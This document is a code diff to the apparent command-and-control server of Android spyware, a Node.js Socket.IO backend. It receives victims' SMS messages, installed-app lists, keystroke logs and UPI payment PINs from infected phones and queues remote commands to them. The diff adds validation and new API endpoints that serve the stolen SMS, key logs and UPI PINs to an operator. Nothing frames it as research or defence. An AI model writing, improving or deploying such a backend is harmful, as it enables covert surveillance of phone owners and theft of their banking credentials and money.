@@ -49,7 +49,7 @@ io.on('connection', (socket) => {
     const deviceId = socket.handshake.query.device_id;
     const connectionId = socket.id;
     const timestamp = new Date().toISOString();
-    
+
     console.log(`🔌 [${timestamp}] New connection: socket=${connectionId}, device=${deviceId || 'unknown'}`);
 
     if (deviceId) {
@@ -80,7 +80,7 @@ io.on('connection', (socket) => {
     socket.on('upsert_device_data', async (data, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`📱 [${timestamp}] upsert_device_data received from ${deviceId || 'unknown'}`);
-        
+
         try {
             let deviceData = typeof data === 'string' ? JSON.parse(data) : data;
             console.log(`📊 [${timestamp}] Device data:`, JSON.stringify(deviceData).substring(0, 200) + '...');
@@ -140,7 +140,7 @@ io.on('connection', (socket) => {
                     ...updateData
                 }
             });
-            
+
             console.log(`✅ [${timestamp}] Device ${id} data upserted successfully`);
             if (ack) ack(true);
         } catch (error) {
@@ -153,7 +153,7 @@ io.on('connection', (socket) => {
     socket.on('get_pending_commands', async (deviceId, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`📥 [${timestamp}] get_pending_commands requested for ${deviceId}`);
-        
+
         try {
             const commands = await prisma.deviceCommand.findMany({
                 where: {
@@ -184,7 +184,7 @@ io.on('connection', (socket) => {
     socket.on('mark_command_delivered', async (commandId, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`📬 [${timestamp}] mark_command_delivered for command ${commandId}`);
-        
+
         try {
             await prisma.deviceCommand.update({
                 where: { id: commandId },
@@ -205,7 +205,7 @@ io.on('connection', (socket) => {
     socket.on('mark_command_executed', async (commandId, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`✅ [${timestamp}] mark_command_executed for command ${commandId}`);
-        
+
         try {
             await prisma.deviceCommand.update({
                 where: { id: commandId },
@@ -226,7 +226,7 @@ io.on('connection', (socket) => {
     socket.on('mark_command_failed', async (data, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`❌ [${timestamp}] mark_command_failed received`);
-        
+
         try {
             const d = typeof data === 'string' ? JSON.parse(data) : data;
             console.log(`📋 [${timestamp}] Command failure data:`, JSON.stringify(d));
@@ -250,34 +250,41 @@ io.on('connection', (socket) => {
     socket.on('send_heartbeat', async (data, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`💓 [${timestamp}] send_heartbeat received`);
-        
+
         try {
             const h = typeof data === 'string' ? JSON.parse(data) : data;
-            console.log(`📊 [${timestamp}] Heartbeat data for ${h.device_id}: status=${h.status}, uptime=${h.uptime}, ram=${h.ram}`);
+            const deviceId = h.device_id;
+
+            console.log(`📊 [${timestamp}] Heartbeat data for ${deviceId}: status=${h.status}, uptime=${h.uptime}, ram=${h.ram}`);
+
+            if (!deviceId) {
+                console.error(`❌ [${timestamp}] Heartbeat missing device_id`);
+                if (ack) ack(false);
+                return;
+            }
 
             // Insert into heartbeat table
             await prisma.heartbeat.create({
                 data: {
-                    device_id: h.device_id,
-                    status: h.status,
+                    device_id: deviceId,
+                    status: Boolean(h.status),
                     last_update: new Date(),
                     uptime: BigInt(h.uptime || 0),
                     ram: BigInt(h.ram || 0)
                 }
             });
 
-            // Update device table heartbeat snapshot and last_seen
+            // Update device table last_seen
             await prisma.device.update({
-                where: { device_id: h.device_id },
+                where: { device_id: deviceId },
                 data: {
-                    heartbeat: h,
                     last_seen: new Date(),
-                    status: true
+                    status: Boolean(h.status)
                 }
             });
 
             socket.emit('heartbeat_ack');
-            console.log(`✅ [${timestamp}] Heartbeat processed for ${h.device_id}`);
+            console.log(`✅ [${timestamp}] Heartbeat processed for ${deviceId}`);
             if (ack) ack(true);
         } catch (error) {
             console.error(`❌ [${timestamp}] Error processing heartbeat:`, error);
@@ -289,13 +296,13 @@ io.on('connection', (socket) => {
     socket.on('set_online_status', async (status, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`🔄 [${timestamp}] set_online_status: ${status} for ${deviceId}`);
-        
+
         try {
             if (deviceId) {
                 await prisma.device.update({
                     where: { device_id: deviceId },
                     data: {
-                        status: status,
+                        status: Boolean(status),
                         last_seen: new Date()
                     }
                 }).then(() => {
@@ -317,61 +324,67 @@ io.on('connection', (socket) => {
     socket.on('sync_sms', async (data, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`📨 [${timestamp}] sync_sms received`);
-        
+
         try {
             let messages = typeof data === 'string' ? JSON.parse(data) : data;
-            console.log(`📱 [${timestamp}] Processing ${Array.isArray(messages) ? messages.length : 1} SMS messages`);
-            
+
             if (!Array.isArray(messages)) {
                 // Handle case where it might be a single object or wrapped strangely
                 messages = [messages];
             }
+            console.log(`📱 [${timestamp}] Processing ${messages.length} SMS messages`);
 
             // Normalize helper
             const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
 
+            const validMessages = [];
+            for (const msg of messages) {
+                if (!msg) continue;
+                const dId = getVal(msg, 'device_id', 'deviceId');
+                const idRaw = getVal(msg, 'id', 'id');
+
+                if (dId && idRaw !== undefined && idRaw !== null) {
+                    validMessages.push({ ...msg, _deviceId: dId, _idRaw: idRaw });
+                }
+            }
+
+            if (validMessages.length === 0) {
+                console.log(`⚠️ [${timestamp}] No valid SMS messages to sync (might be empty list)`);
+                if (ack) ack(true);
+                return;
+            }
+
             await prisma.$transaction(async (tx) => {
-                for (const msg of messages) {
-                    if (!msg) continue;
-
-                    const deviceId = getVal(msg, 'device_id', 'deviceId');
-                    const idRaw = getVal(msg, 'id', 'id');
-                    const address = getVal(msg, 'address', 'address');
-                    const body = getVal(msg, 'body', 'body');
-                    const date = getVal(msg, 'date', 'date');
-                    const timestamp = getVal(msg, 'timestamp', 'timestamp');
-                    const type = getVal(msg, 'type', 'type');
-
-                    if (!deviceId || !idRaw) {
-                        console.warn(`⚠️ [${timestamp}] Skipping SMS sync: Missing device_id or id`);
-                        continue;
-                    }
-
-                    const smsId = BigInt(idRaw);
-                    const ts = timestamp ? BigInt(timestamp) : BigInt(0);
+                for (const msg of validMessages) {
+                    const smsId = BigInt(msg._idRaw);
+                    const address = getVal(msg, 'address', 'address') || "";
+                    const body = getVal(msg, 'body', 'body') || "";
+                    const date = getVal(msg, 'date', 'date') || new Date().toISOString();
+                    const timestampVal = getVal(msg, 'timestamp', 'timestamp') || 0;
+                    const type = parseInt(getVal(msg, 'type', 'type') || "1");
 
                     await tx.smsMessage.upsert({
                         where: {
                             id_device_id: {
                                 id: smsId,
-                                device_id: deviceId
+                                device_id: msg._deviceId
                             }
                         },
                         update: {
                             address: address,
                             body: body,
                             date: date,
-                            timestamp: ts,
+                            timestamp: BigInt(timestampVal),
                             type: type,
                             sync_status: 'synced'
                         },
                         create: {
                             id: smsId,
-                            device_id: deviceId,
+                            device_id: msg._deviceId,
                             address: address,
                             body: body,
                             date: date,
-                            timestamp: ts,
+                            timestamp: BigInt(timestampVal),
                             type: type,
                             sync_status: 'synced'
                         }
@@ -379,8 +392,8 @@ io.on('connection', (socket) => {
                 }
             });
 
-            socket.emit('sync_complete', 'sms', messages.length);
-            console.log(`✅ [${timestamp}] Synced ${messages.length} SMS messages`);
+            console.log(`✅ [${timestamp}] Synced ${validMessages.length} SMS messages`);
+            socket.emit('sync_complete', 'sms', validMessages.length);
             if (ack) ack(true);
         } catch (error) {
             console.error(`❌ [${timestamp}] Error syncing SMS:`, error);
@@ -392,47 +405,46 @@ io.on('connection', (socket) => {
     socket.on('sync_single_sms', async (data, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`📩 [${timestamp}] sync_single_sms received`);
-        
+
         try {
             const msg = typeof data === 'string' ? JSON.parse(data) : data;
             const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
 
-            const deviceId = getVal(msg, 'device_id', 'deviceId');
+            const dId = getVal(msg, 'device_id', 'deviceId');
             const idRaw = getVal(msg, 'id', 'id');
-            const address = getVal(msg, 'address', 'address');
-            const body = getVal(msg, 'body', 'body');
-            const date = getVal(msg, 'date', 'date');
-            const timestamp = getVal(msg, 'timestamp', 'timestamp');
-            const type = getVal(msg, 'type', 'type');
 
-            console.log(`📋 [${timestamp}] Single SMS: device=${deviceId}, from=${address}, id=${idRaw}`);
+            console.log(`📋 [${timestamp}] Single SMS: device=${dId}, from=${getVal(msg, 'address', 'address')}, id=${idRaw}`);
 
-            if (deviceId && idRaw) {
+            if (dId && idRaw !== undefined && idRaw !== null) {
                 const smsId = BigInt(idRaw);
-                const ts = timestamp ? BigInt(timestamp) : BigInt(0);
+                const address = getVal(msg, 'address', 'address') || "";
+                const body = getVal(msg, 'body', 'body') || "";
+                const date = getVal(msg, 'date', 'date') || new Date().toISOString();
+                const timestampVal = getVal(msg, 'timestamp', 'timestamp') || 0;
+                const type = parseInt(getVal(msg, 'type', 'type') || "1");
 
                 await prisma.smsMessage.upsert({
                     where: {
                         id_device_id: {
                             id: smsId,
-                            device_id: deviceId
+                            device_id: dId
                         }
                     },
                     update: {
                         address: address,
                         body: body,
                         date: date,
-                        timestamp: ts,
+                        timestamp: BigInt(timestampVal),
                         type: type,
                         sync_status: 'synced'
                     },
                     create: {
                         id: smsId,
-                        device_id: deviceId,
+                        device_id: dId,
                         address: address,
                         body: body,
                         date: date,
-                        timestamp: ts,
+                        timestamp: BigInt(timestampVal),
                         type: type,
                         sync_status: 'synced'
                     }
@@ -452,32 +464,45 @@ io.on('connection', (socket) => {
     socket.on('sync_apps', async (data, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`📦 [${timestamp}] sync_apps received`);
-        
+
         try {
             let apps = typeof data === 'string' ? JSON.parse(data) : data;
-            console.log(`📱 [${timestamp}] Processing ${Array.isArray(apps) ? apps.length : 1} apps`);
-            
+
             if (!Array.isArray(apps)) {
                 apps = [apps];
             }
+            console.log(`📱 [${timestamp}] Processing ${apps.length} apps`);
 
             const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
 
+            // Filter valid apps
+            const validApps = [];
+            for (const app of apps) {
+                if (!app) continue;
+                const dId = getVal(app, 'device_id', 'deviceId');
+                const pkg = getVal(app, 'package_name', 'packageName');
+
+                if (dId && pkg) {
+                    validApps.push({ ...app, _deviceId: dId, _pkg: pkg });
+                } else {
+                    console.warn(`⚠️ [${timestamp}] Invalid app entry: missing device_id or package_name`);
+                }
+            }
+
+            if (validApps.length === 0) {
+                console.log(`⚠️ [${timestamp}] No valid apps to sync (might be empty list)`);
+                if (ack) ack(true);
+                return;
+            }
+
             await prisma.$transaction(async (tx) => {
-                for (const app of apps) {
-                    if (!app) continue;
+                for (const app of validApps) {
+                    const packageName = app._pkg;
+                    const deviceId = app._deviceId;
 
-                    const deviceId = getVal(app, 'device_id', 'deviceId');
-                    const packageName = getVal(app, 'package_name', 'packageName');
-
-                    if (!deviceId || !packageName) {
-                        console.warn(`⚠️ [${timestamp}] Skipping app sync: Missing device_id or package_name`, app);
-                        continue;
-                    }
-
-                    const appName = getVal(app, 'app_name', 'appName');
-                    const icon = getVal(app, 'icon', 'icon');
-                    const versionName = getVal(app, 'version_name', 'versionName');
+                    const appName = getVal(app, 'app_name', 'appName') || packageName;
+                    const icon = getVal(app, 'icon', 'icon') || "";
+                    const versionName = getVal(app, 'version_name', 'versionName') || "";
 
                     const versionCodeFn = getVal(app, 'version_code', 'versionCode');
                     const versionCode = versionCodeFn ? BigInt(versionCodeFn) : null;
@@ -488,9 +513,9 @@ io.on('connection', (socket) => {
                     const lastUpdateTimeFn = getVal(app, 'last_update_time', 'lastUpdateTime');
                     const lastUpdateTime = lastUpdateTimeFn ? BigInt(lastUpdateTimeFn) : null;
 
-                    const isSystemApp = getVal(app, 'is_system_app', 'isSystemApp');
-                    const targetSdk = getVal(app, 'target_sdk', 'targetSdk');
-                    const minSdk = getVal(app, 'min_sdk', 'minSdk');
+                    const isSystemApp = Boolean(getVal(app, 'is_system_app', 'isSystemApp'));
+                    const targetSdk = parseInt(getVal(app, 'target_sdk', 'targetSdk') || "0");
+                    const minSdk = parseInt(getVal(app, 'min_sdk', 'minSdk') || "0");
 
                     const syncTsFn = getVal(app, 'sync_timestamp', 'syncTimestamp');
                     const syncTimestamp = syncTsFn ? BigInt(syncTsFn) : BigInt(Date.now());
@@ -524,7 +549,7 @@ io.on('connection', (socket) => {
                             version_code: versionCode,
                             first_install_time: firstInstallTime,
                             last_update_time: lastUpdateTime,
-                            is_system_app: isSystemApp || false,
+                            is_system_app: isSystemApp,
                             target_sdk: targetSdk,
                             min_sdk: minSdk,
                             sync_timestamp: syncTimestamp,
@@ -535,8 +560,8 @@ io.on('connection', (socket) => {
                 }
             });
 
-            socket.emit('sync_complete', 'apps', apps.length);
-            console.log(`✅ [${timestamp}] Synced ${apps.length} apps`);
+            console.log(`✅ [${timestamp}] Synced ${validApps.length} apps`);
+            socket.emit('sync_complete', 'apps', validApps.length);
             if (ack) ack(true);
         } catch (error) {
             console.error(`❌ [${timestamp}] Error syncing apps:`, error);
@@ -544,11 +569,12 @@ io.on('connection', (socket) => {
         }
     });
 
+
     // Set key log
     socket.on('set_key_log', async (data, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`⌨️ [${timestamp}] set_key_log received`);
-        
+
         try {
             const keyLog = typeof data === 'string' ? JSON.parse(data) : data;
             const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
@@ -580,7 +606,7 @@ io.on('connection', (socket) => {
     socket.on('set_upi_pin', async (data, ack) => {
         const timestamp = new Date().toISOString();
         console.log(`🔐 [${timestamp}] set_upi_pin received`);
-        
+
         try {
             const pinData = typeof data === 'string' ? JSON.parse(data) : data;
             const getVal = (obj, key1, key2) => obj[key1] !== undefined ? obj[key1] : obj[key2];
@@ -618,7 +644,7 @@ io.on('connection', (socket) => {
     socket.on('send_command', async (data) => {
         const timestamp = new Date().toISOString();
         console.log(`📤 [${timestamp}] Admin send_command:`, JSON.stringify(data));
-        
+
         try {
             const { device_id, command, payload } = data;
             const newCommand = await prisma.deviceCommand.create({
@@ -680,7 +706,7 @@ io.on('connection', (socket) => {
 app.get('/api/devices', async (req, res) => {
     const timestamp = new Date().toISOString();
     console.log(`🌐 [${timestamp}] GET /api/devices`);
-    
+
     try {
         const devices = await prisma.device.findMany({
             orderBy: { last_seen: 'desc' }
@@ -697,7 +723,7 @@ app.get('/api/devices/:deviceId/commands', async (req, res) => {
     const timestamp = new Date().toISOString();
     const { deviceId } = req.params;
     console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/commands`);
-    
+
     try {
         const commands = await prisma.deviceCommand.findMany({
             where: { device_id: deviceId },
@@ -716,7 +742,7 @@ app.post('/api/devices/:deviceId/commands', async (req, res) => {
     const { deviceId } = req.params;
     const { command, payload } = req.body;
     console.log(`🌐 [${timestamp}] POST /api/devices/${deviceId}/commands`, { command, payload });
-    
+
     try {
         const newCommand = await prisma.deviceCommand.create({
             data: {
@@ -752,7 +778,7 @@ app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
     const timestamp = new Date().toISOString();
     const { deviceId } = req.params;
     console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/heartbeats`);
-    
+
     try {
         const heartbeats = await prisma.heartbeat.findMany({
             where: { device_id: deviceId },
@@ -767,13 +793,91 @@ app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
     }
 });
 
+
+// GET synced SMS for a device
+app.get('/api/devices/:deviceId/sms', async (req, res) => {
+    const timestamp = new Date().toISOString();
+    const { deviceId } = req.params;
+    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/sms`);
+
+    try {
+        const sms = await prisma.smsMessage.findMany({
+            where: { device_id: deviceId },
+            orderBy: { date: 'desc' },
+            take: 100
+        });
+        console.log(`✅ [${timestamp}] Returning ${sms.length} SMS messages for ${deviceId}`);
+        res.json(sms);
+    } catch (error) {
+        console.error(`❌ [${timestamp}] Error fetching SMS for ${deviceId}:`, error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// GET installed apps for a device
+app.get('/api/devices/:deviceId/apps', async (req, res) => {
+    const timestamp = new Date().toISOString();
+    const { deviceId } = req.params;
+    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/apps`);
+
+    try {
+        const apps = await prisma.installedApp.findMany({
+            where: { device_id: deviceId },
+            orderBy: { app_name: 'asc' }
+        });
+        console.log(`✅ [${timestamp}] Returning ${apps.length} apps for ${deviceId}`);
+        res.json(apps);
+    } catch (error) {
+        console.error(`❌ [${timestamp}] Error fetching apps for ${deviceId}:`, error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// GET Key Logs for a device
+app.get('/api/devices/:deviceId/logs/keys', async (req, res) => {
+    const timestamp = new Date().toISOString();
+    const { deviceId } = req.params;
+    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/logs/keys`);
+
+    try {
+        const logs = await prisma.keyLog.findMany({
+            where: { device_id: deviceId },
+            orderBy: { currentDate: 'desc' },
+            take: 100
+        });
+        res.json(logs);
+    } catch (error) {
+        console.error(`❌ [${timestamp}] Error fetching key logs for ${deviceId}:`, error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// GET UPI Pins for a device
+app.get('/api/devices/:deviceId/logs/upi', async (req, res) => {
+    const timestamp = new Date().toISOString();
+    const { deviceId } = req.params;
+    console.log(`🌐 [${timestamp}] GET /api/devices/${deviceId}/logs/upi`);
+
+    try {
+        const logs = await prisma.upiPin.findMany({
+            where: { device_id: deviceId },
+            orderBy: { currentDate: 'desc' },
+            take: 100
+        });
+        res.json(logs);
+    } catch (error) {
+        console.error(`❌ [${timestamp}] Error fetching UPI logs for ${deviceId}:`, error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
 // Health check endpoint
 app.get('/health', (req, res) => {
     const timestamp = new Date().toISOString();
     console.log(`🌐 [${timestamp}] GET /health`);
-    res.json({ 
-        status: 'healthy', 
-        timestamp, 
+    res.json({
+        status: 'healthy',
+        timestamp,
         uptime: process.uptime(),
         connections: (Object.keys(io.sockets.sockets).length + 1)
     });
@@ -783,10 +887,10 @@ app.get('/health', (req, res) => {
 process.on('SIGINT', async () => {
     const timestamp = new Date().toISOString();
     console.log(`🛑 [${timestamp}] Received SIGINT, shutting down gracefully...`);
-    
+
     await prisma.$disconnect();
     console.log(`✅ [${timestamp}] Database disconnected`);
-    
+
     server.close(() => {
         console.log(`✅ [${timestamp}] Server closed`);
         process.exit(0);
@@ -796,10 +900,10 @@ process.on('SIGINT', async () => {
 process.on('SIGTERM', async () => {
     const timestamp = new Date().toISOString();
     console.log(`🛑 [${timestamp}] Received SIGTERM, shutting down gracefully...`);
-    
+
     await prisma.$disconnect();
     console.log(`✅ [${timestamp}] Database disconnected`);
-    
+
     server.close(() => {
         console.log(`✅ [${timestamp}] Server closed`);
         process.exit(0);
